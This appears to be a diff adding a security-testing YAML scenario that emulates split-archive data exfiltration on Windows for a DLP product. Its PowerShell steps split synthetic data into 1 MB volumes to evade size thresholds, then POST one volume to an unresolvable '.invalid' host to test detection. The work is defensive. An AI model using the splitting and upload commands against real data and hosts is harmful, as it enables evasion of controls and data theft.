@@ -1,0 +1,142 @@
+id: collection-archive-split-exfil
+product_line: dlp
+name: Split Archive Exfiltration Probe
+description: >
+  Telemetry-safe emulation of an adversary who breaks a collected archive into
+  fixed-size volumes so that each piece is below a per-file size or per-transfer
+  threshold, and then sends one volume. The data is synthetic [BAS-SIM] text. The
+  upload goes to an RFC-6761 .invalid host, so nothing leaves the host. The check
+  is whether DLP and egress controls see the split pattern, not only the whole
+  archive.
+
+  KILL CHAIN STAGES:
+    1. Volume Split    — write synthetic data and split it into 1 MB volumes with a native archive call (T1560.001)
+    2. Volume Upload   — POST one volume to an RFC-6761 .invalid host (T1048.003)
+
+  SAFETY: All data is synthetic. The volumes are deleted in cleanup. The destination
+  is a .invalid host and cannot resolve. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - archive
+  - split
+  - exfiltration
+  - dlp
+  - t1560
+  - t1048
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Volume Split (T1560.001)
+  # ---------------------------------------------------------------------------
+  - name: "Split Archive 1 — Multi-Volume Archive of Synthetic Data (T1560.001)"
+    technique_id: T1560.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Writes a 6 MB synthetic [BAS-SIM] file under %TEMP%\\bas_split_<runid> and splits it into 1 MB volumes by writing fixed-size byte chunks. No external archiver is required. Volumes are deleted in cleanup."
+    telemetry:
+      - "Sysmon EID 11: multiple equal-size volume files created under %TEMP%\\bas_split_<runid>"
+    detection:
+      - "DLP/EDR: a run of equal-size archive volumes created in one folder — split-archive IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_split_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      $src = Join-Path $work 'source.bin'
+      $marker = [System.Text.Encoding]::ASCII.GetBytes("[BAS-SIM] split synthetic block run=$runId`n")
+      $fs = [System.IO.File]::Open($src, 'Create', 'Write')
+      try {
+        $written = 0
+        while ($written -lt 6MB) {
+          $n = [Math]::Min($marker.Length, 6MB - $written)
+          $fs.Write($marker, 0, $n)
+          $written += $n
+        }
+      } finally { $fs.Close() }
+      $volSize = 1MB
+      $in = [System.IO.File]::OpenRead($src)
+      try {
+        $idx = 0
+        $buf = New-Object byte[] $volSize
+        while (($read = $in.Read($buf, 0, $volSize)) -gt 0) {
+          $idx++
+          $vol = Join-Path $work ("source.part{0:d3}" -f $idx)
+          if ($read -eq $volSize) {
+            [System.IO.File]::WriteAllBytes($vol, $buf)
+          } else {
+            $tail = New-Object byte[] $read
+            [Array]::Copy($buf, $tail, $read)
+            [System.IO.File]::WriteAllBytes($vol, $tail)
+          }
+        }
+      } finally { $in.Close() }
+      $vols = @(Get-ChildItem -Path $work -Filter 'source.part*')
+      Write-Output "EXEC T1560.001: split the synthetic file into $($vols.Count) volume(s) of about 1 MB. Split Stage 1. [BAS-SIM-SPL-S1]"
+      if ($vols.Count -gt 1) {
+        Write-Output "FAIL: A multi-volume split of collected data was created with no alert. Splitting an archive below per-file thresholds is an evasion pattern DLP should flag."
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Volume Upload (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Split Archive 2 — Single Volume Upload Attempt to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "POSTs one 1 MB synthetic volume from Stage 1 to an RFC-6761 .invalid host. The host cannot resolve, so nothing leaves the host. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "Proxy/egress: a 1 MB POST that matches a split-volume name"
+    detection:
+      - "Egress/DLP: a volume file named like a split archive sent outbound — split-transfer alert expected"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $vol = Join-Path $env:TEMP "bas_split_$runId\source.part001"
+      if (-not (Test-Path $vol)) {
+        Write-Output "SKIP: T1048.003: no split volume from Stage 1 to send. [BAS-SIM-SPL-S2]"
+        exit 0
+      }
+      $target = "http://bas-sim-split-$runId.invalid/upload"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -InFile $vol -ContentType 'application/octet-stream' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted a 1 MB POST of one split volume to $target. reached=$reached (expected: false). Split upload Stage 2. [BAS-SIM-SPL-S2]"
+      if ($reached) {
+        Write-Output "FAIL: A split archive volume was delivered to an unknown host. Egress is not matching split-archive patterns."
+      } else {
+        Write-Output "FAIL: The endpoint attempted to send a split archive volume to an unknown host with no alert. Unreachable only because the domain is .invalid."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_split_*') -Recurse -Force -ErrorAction SilentlyContinue
